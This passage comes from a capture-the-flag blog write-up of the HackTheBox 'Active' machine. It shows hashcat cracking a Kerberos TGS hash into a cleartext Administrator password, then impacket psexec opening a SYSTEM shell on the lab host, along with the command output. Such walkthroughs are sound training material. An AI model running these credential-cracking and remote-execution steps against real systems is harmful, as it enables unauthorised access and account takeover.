9503ed3678c1c7c6ca7b7d950c0ce92a2c4fc7685c99c2f4aec07ffdbbddefa761691d43ec108506874976e059c847de84dfce0fe17d9fe151a14dc18c2d474e0c3680b0274981929bd0d994d2cb40e1d74f17a794f6101af5161b21ec1920317ffb9583598380d069412defccf3093ec63a9243ccb48f327ce7c7a9dc713db98c2588f28336262f8b331178eacb56f3f412e674ec1de244460514e0c90fd8a35e9cf7ab931370a4d26806f8b36c902cdbf9bd31b100912bf910986c7560a854d07a94c96246d0b6aec484cfc09c2fdc38c0aa07061dc21617bfc2c3a8c1c29b58f8df1d4105131c7b0d46e0564292c1236b64a097f3d9b9bdba499370bf57ddbfe4e4149dfa1aa95345480e087f982afee87d98be58f2fa1b8dccdbb4d0e292305206296a2b
+</pre></div>
+
+
+<p>Checking into the <a href="https://hashcat.net/wiki/doku.php?id=example_hashes"><code>hashcat</code> example hashes page</a> we can see the above hash corresponds to the hash-mode 13100, Kerberos 5 TGS-REP etype 23. So let's try to crack this hash with <code>hashcat</code>:</p>
+<div class="highlight"><pre><span></span><span class="gp">m4rc0ff@SittingDucks:~$</span> hashcat -m <span class="m">13100</span> -a <span class="m">0</span> UserSPNs.out /usr/share/wordlists/rockyou.txt --force                                                                                                       hashcat <span class="o">(</span>v5.1.0<span class="o">)</span> starting...       
+
+<span class="go">&lt;SNIP&gt;</span>
+
+<span class="gp">$</span>krb5tgs<span class="nv">$23$*</span>Administrator<span class="nv">$ACTIVE</span>.HTB<span class="nv">$active</span>/CIFS~445*<span class="nv">$e7d1aaeab1d15b9f580ac541730fc7a7$42</span>c4e2f8f77a818dfa8b88b8ed54a89c1a84c36d60b01f90f65efb71b709260a856eff3c4f1858c07fa637cf22621648dd996d6e95b0c8a84a9d68483939da6a122f1a98d6f6e8c601719515f3951c383dd4fc311067f5e1003ecbd6eeb9a80a9f22a621a12c128e8763755d000d4dac4e3caa00ed4e0a0e2c8f603b0f3cbe85a7f755a9cc51bef72cceac934fd64d61de350170a7fadb686f361fe8d0b949733d1ebf87a22ecb7fe7c1a8912bbf69b32665f8d55523e8078e1a4b0e314a52bfda7785514bc77a97c6ac2ce6c04efff310cb095d1edc75925608a3dde886474ba05c2902db8e8a767a732edad05f65b5ed5f876fb70a1870ca2797d8938dae38e66a8092d99b403761f68e23a0f989e486a39456cfdc07cc36340f8da30061c6ed3c53e7060f5368ec945fcc3adfbbd83ddd7b28c339bde70c4f80c4f1c3fca28bc38f7a720ea206b3b434991737b25e931c3b6c7bd50adfb7eb5f99f904423383f5f30562bc9e8700a94b31c0830d7516f8f6ed7d2411083a5fb1a3ef074064364a11e0e4a3b3bc7766e3ae74a4a13f01052e19fe8a010acffd0c0c994560ddb23c7b726a3ea74d518dce6d172e30941c793668aa4b257020ec8d589edfe5edad9e156d1fb39d8adef8d9b95f19629c3b27aba285ee5f8c453bab8bf2f8f7b202fd176d059d34960e05e1a6c242bf510505cda9ca25a5f1d2029981beafc561b1bb141bcbfcf8a89cf7444211357a241370835de474a4aac083a1d71b18f830ced2255326e018832577106d6cdd4e4c0fd88cb5729944168937f6b314e32b1a353953c8d8aa8dcec06d8d2a356b28cc17f55f0a9503ed3678c1c7c6ca7b7d950c0ce92a2c4fc7685c99c2f4aec07ffdbbddefa761691d43ec108506874976e059c847de84dfce0fe17d9fe151a14dc18c2d474e0c3680b0274981929bd0d994d2cb40e1d74f17a794f6101af5161b21ec1920317ffb9583598380d069412defccf3093ec63a9243ccb48f327ce7c7a9dc713db98c2588f28336262f8b331178eacb56f3f412e674ec1de244460514e0c90fd8a35e9cf7ab931370a4d26806f8b36c902cdbf9bd31b100912bf910986c7560a854d07a94c96246d0b6aec484cfc09c2fdc38c0aa07061dc21617bfc2c3a8c1c29b58f8df1d4105131c7b0d46e0564292c1236b64a097f3d9b9bdba499370bf57ddbfe4e4149dfa1aa95345480e087f982afee87d98be58f2fa1b8dccdbb4d0e292305206296a2b:Ticketmaster1968
+</pre></div>
+
+
+<p><code>hashcat</code> found the password in few minutes, which is <code>Ticketmaster1968</code>.</p>
+<p>With this administrative credentials we should now be able to connect to the <code>Users</code> share again and grab the <code>root.txt</code> flag.</p>
+<div class="highlight"><pre><span></span><span class="gp">m4rc0ff@SittingDucks:~/Documents/htbBoxes/active$</span> cat root.txt 
+<span class="go">b5****************************8b</span>
+</pre></div>
+
+
+<p>We can also easily get a shell using another script from the impacket framework, <code>psexec</code>:</p>
+<div class="highlight"><pre><span></span><span class="gp">m4rc0ff@SittingDucks:~/Tools/psexec$</span> ./psexec.py active.htb/administrator@10.10.10.100
+<span class="go">Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation</span>
+
+<span class="go">Password:</span>
+<span class="go">[*] Requesting shares on 10.10.10.100.....</span>
+<span class="go">[*] Found writable share ADMIN$</span>
+<span class="go">[*] Uploading file FhkmrxYH.exe</span>
+<span class="go">[*] Opening SVCManager on 10.10.10.100.....</span>
+<span class="go">[*] Creating service MzVf on 10.10.10.100.....</span>
+<span class="go">[*] Starting service MzVf.....</span>
+<span class="go">[!] Press help for extra shell commands</span>
+<span class="go">Microsoft Windows [Version 6.1.7601]</span>
+<span class="go">Copyright (c) 2009 Microsoft Corporation.  All rights reserved.</span>
+
+<span class="go">C:\Windows\system32&gt;whoami</span>
+<span class="go">nt authority\system</span>
+
+<span class="go">C:\Windows\system32&gt;</span>
+</pre></div>
+			<style>
+#pcs-comment-form input,
+#pcs-comment-form textarea {
+	width: 100%;
+}
+#pcs-comment-form-display-replyto {
+	border: solid 1px black;
+	padding: 2px;
+}
+#pcs-comment-form-display-replyto p {
+	margin-top: 0.5em;
+	margin-bottom: 0.5em;
+}
+#pcs-comments ul {
+	list-style: none;
+}
+#pcs-comments .comment-left {
+	display: table-cell;
+	padding-right: 10px;
+}
+#pcs-comments .comment-body {
+	display: table-cell;
+	vertical-align: top;
+	width: 100%;
+}
+</style>
+
+	<section id="pcs-comments">
+	<header>
+		<h2>Comments</h2>
+		<hr/>
+	</header>
+		<p>There are no comments yet.</p>
+	<section>
+	<form id="pcs-comment-form" action="#">
+		<legend>Add a Comment</legend>
+		<input type="hidden" id="pcs-comment-form-input-replyto">
+		<fieldset>
+			<label for="pcs-comment-form-input-name">Name</label>
+			<input  id="pcs-comment-form-input-name" type="text" placeholder="Enter your name or nickname" />
+		</fieldset>
+		<fieldset>
+			<label for="pcs-comment-form-input-website">Website</label>
+			<input  id="pcs-comment-form-input-website" type="text" placeholder="Enter your website (optional)" />
+		</fieldset>
+		<fieldset>
+			<label   for="pcs-comment-form-input-textarea">Your Comment</label>
+			<textarea id="pcs-comment-form-input-textarea" rows="5" style="resize:vertical;" placeholder="Your comment"></textarea>
+			<p>You can use the <a href="https://en.wikipedia.org/wiki/Markdown">Markdown</a> syntax to format your comment.</p>
+			<div style="display: none; " id="pcs-comment-form-display-replyto"></div>
+		</fieldset>
+
+		<button type="submit"
+				id="pcs-comment-form-button-submit"
+				>Post via email</button>
+
+			<a href="https://sittingducks.io/feeds/comment.Active.atom.xml">
+				Comment Atom Feed
+			</a>
+	</form>
+</section>
+
+</section>
+
+			<script type="text/javascript" src="https://code.jquery.com/jquery-2.1.4.min.js"></script>
+	<script type="text/javascript" src="https://sittingducks.io/theme/js/comments.js"></script>
+	<script type="text/javascript">
+		$(document).ready(function() {
+			CommentSystem.email_user   = "sittingducks.io";
+			CommentSystem.email_domain = "protonmail.com";
+			CommentSystem.display_replyto_html = function(comment_content, article_slug, author) { 
+				return ''
+					+ '<button style="float:right;" onclick="CommentSystem.cancelReply(); return false;" title="Cancel the reply">'
+					+ 	'×'
+					+ '</button>'
+					+ '<p>This comment will be posted as a reply to \'<a title="'+comment_content+'" href="#comment-'+article_slug+'">'+author+'</a>\'</p>';
+			};
+
+			$('#pcs-comment-form').on("submit",
+				function( event )
+				{
+					event.preventDefault();
+					$(location).attr('href', CommentSystem.getMailtoLink("Active"));
+				}
+			);
+		});
+	</script>
+
+
+      </div><!-- .entry-content -->
+      <br /><br />
+      <div class="article_meta">
+        Tags:
+          <a href="https://sittingducks.io/tag/hackthebox.html">HackTheBox</a>      </div>
+    </div>
+  </div>
+</article><!-- #post-## -->
+                </div>
+              </div><!-- #main -->
+          </div><!-- #primary -->
+        </div>
+      </div><!-- close .row -->
+    </div><!-- close .container -->
+  </div><!-- close .site-content -->
+
+
+
+
+  <div id="footer-area">
+    <footer id="colophon" class="site-footer" role="contentinfo">
+      <div class="site-info container">
+        <div class="row">
+                    <div class="copyright col-md-12">
+                    <a href="https://sittingducks.io/pages/privacy-policy">Privacy Policy</a> | 
+                    <a href="https://sittingducks.io/feeds/all.atom.xml">Atom Feed</a> | 
+                    <a href="https://sittingducks.io/sitemap.xml">Sitemap</a><br />
+                    &copy; 2019 <a href="https://sittingducks.io">Marco Meli</a> </div>
+        </div>
+      </div><!-- .site-info -->
+      <div class="scroll-to-top" style="display: none;"><i class="fa fa-angle-up"></i></div><!-- .scroll-to-top -->
+    </footer><!-- #colophon -->
+  </div>
+
+  <script type="text/javascript">
+    window.addEventListener('load', function(){
+    if (window.location.pathname != '/' && window.location.pathname != '/index.html'){
+      window.scroll(0, document.getElementById('main').offsetTop);
+    }})
+  </script>
+
+  
+ <!-- <script src="https://sittingducks.io/theme/js/jquery.min.js"></script> -->
+	<!-- Make sure jquery is loaded first, then load colorbox -->
+  <script src="https://sittingducks.io/theme/js/jquery.colorbox-min.js"></script>
+  <script src="https://sittingducks.io/theme/js/load-colorbox.js"></script>
+
+
+  
+  
+</body>
+</html>
